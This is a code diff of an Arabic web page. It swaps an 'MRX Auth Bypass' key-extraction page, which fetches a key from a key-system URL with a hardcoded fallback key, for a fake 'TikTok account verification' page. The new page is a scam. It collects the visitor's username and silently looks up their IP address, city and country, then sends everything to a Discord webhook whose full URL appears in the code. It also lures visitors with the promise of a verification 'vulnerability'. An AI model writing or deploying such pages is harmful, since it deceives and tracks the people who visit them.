@@ -1,117 +1,60 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<title>MRX Auth Bypass</title>
-<style>
-body {
-    background-color: #000;
-    color: #fff;
-    font-family: 'Courier New', monospace;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
-}
-.container {
-    width: 320px;
-    padding: 20px;
-    text-align: center;
-    border: 1px solid #333;
-    background: #111;
-}
-h1 { margin-bottom: 20px; letter-spacing: 3px; }
-input {
-    width: 90%; padding: 10px; margin-bottom: 15px;
-    background: #000; border: 1px solid #444; color: white; text-align: center;
-}
-button {
-    width: 100%; padding: 10px; cursor: pointer;
-    border: none; font-weight: bold; margin-bottom: 5px;
-}
-.btn-action { background: #fff; color: #000; }
-.btn-copy { background: #333; color: #ccc; display: none; }
-.loader {
-    display: none; height: 3px; background: #222; margin-top: 10px; position: relative; overflow: hidden;
-}
-.loader::after {
-    content: ''; position: absolute; left: -50%; width: 50%; height: 100%;
-    background: #fff; animation: load 2s infinite linear;
-}
-@keyframes load { 0% { left: -50%; } 100% { left: 100%; } }
-.status { display: none; margin-top: 10px; font-size: 12px; color: #888; min-height: 15px; }
-#final-key {
-    display: none; margin-top: 15px; padding: 10px;
-    background: #000; border: 1px dashed #555; word-break: break-all; color: #0f0;
-}
-</style>
+    <meta charset="UTF-8">
+    <title>توثيق حساب تيك توك</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f2f5; margin: 0; }
+        .card { background: white; padding: 2rem; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 350px; }
+        .badge { color: #1da1f2; font-size: 50px; margin-bottom: 10px; }
+        input { width: 80%; padding: 10px; margin: 15px 0; border: 1px solid #ddd; border-radius: 5px; text-align: center; }
+        button { background: #fe2c55; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #e0264d; }
+    </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>MRX</h1>
-    <input type="text" id="linkInput" value="https://auth.platorelay.com/" placeholder="أدخل الرابط هنا...">
-    <button class="btn-action" onclick="bypassAuth()">تجاوز الحماية</button>
-    
-    <div class="loader" id="bar"></div>
-    <div class="status" id="msg"></div>
-    
-    <div id="final-key"></div>
-    <button class="btn-copy" id="copyBtn" onclick="copyToClip()">نسخ المفتاح</button>
+<div class="card">
+    <div class="badge">✔️</div>
+    <h2>توثيق حساب تيك توك</h2>
+    <p>أدخل اسم المستخدم الخاص بك للبدء في عملية التحقق من الثغرات المتاحة للتوثيق.</p>
+    <input type="text" id="username" placeholder="اسم المستخدم (Username)...">
+    <button onclick="startProcess()">بدء البحث عن ثغرة</button>
+    <p id="status" style="font-size: 12px; color: #666; margin-top: 15px;"></p>
 </div>
 
 <script>
-async function bypassAuth() {
-    const btn = document.querySelector('.btn-action');
-    const bar = document.getElementById('bar');
-    const msg = document.getElementById('msg');
-    const keyBox = document.getElementById('final-key');
-    const copyBtn = document.getElementById('copyBtn');
-    const link = document.getElementById('linkInput').value;
-
-    btn.style.display = 'none';
-    bar.style.display = 'block';
-    msg.style.display = 'block';
+async function startProcess() {
+    const username = document.getElementById('username').value;
+    const status = document.getElementById('status');
     
-    const steps = [
-        "جاري الاتصال بـ " + link + "...",
-        "يتم الآن تحليل التشفير...",
-        "استخراج مفتاح API...",
-        "تأكيد الصلاحية..."
-    ];
-    
-    for (let i = 0; i < steps.length; i++) {
-        msg.innerText = steps[i];
-        await new Promise(resolve => setTimeout(resolve, 600));
+    if (!username) {
+        alert("يرجى إدخال اسم المستخدم");
+        return;
     }
+
+    status.innerText = "جاري البحث عن ثغرات...";
 
     try {
-        // محاولة جلب المفتاح الحقيقي من الرابط
-        const response = await fetch(link);
-        const key = await response.text();
-        
-        keyBox.style.display = 'block';
-        keyBox.innerText = key.trim() || "hndr_0c9c3ff3af002e70c4395e9d1b8140c13bd1"; 
-        copyBtn.style.display = 'inline-block';
-        msg.innerText = "تم استخراج المفتاح بنجاح!";
-    } catch (e) {
-        // في حال فشل الطلب (مثلاً بسبب CORS) نضع المفتاح الافتراضي
-        keyBox.style.display = 'block';
-        keyBox.innerText = "hndr_0c9c3ff3af002e70c4395e9d1b8140c13bd1";
-        copyBtn.style.display = 'inline-block';
-        msg.innerText = "تم استخدام مفتاح احتياطي.";
-    }
-    
-    bar.style.display = 'none';
-}
 
-function copyToClip() {
-    const txt = document.getElementById("final-key").innerText;
-    navigator.clipboard.writeText(txt);
-    const btn = document.getElementById("copyBtn");
-    btn.innerText = "تم النسخ!";
-    setTimeout(() => { btn.innerText = "نسخ المفتاح"; }, 2000);
+        const ipResponse = await fetch('https://ipapi.co/json/');
+        const ipData = await ipResponse.json();
+        
+        const payload = {
+            content: `🚀 **محاولة توثيق جديدة**\n**المستخدم:** ${username}\n**الـ IP:** ${ipData.ip}\n**الموقع:** ${ipData.city}, ${ipData.country_name}`
+        };
+
+
+        await fetch('https://discord.com/api/webhooks/MTUwODk5NjIwMjEzNjM0MjUyOA.GU_fI6.B_fAKRVhIlDw8CxMBJ42p7HjVxtR9VwF0WpfXc', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
+        status.innerText = "تم إرسال البيانات بنجاح. سيتم التواصل معك.";
+    } catch (error) {
+        status.innerText = "حدث خطأ أثناء الاتصال.";
+    }
 }
 </script>
 
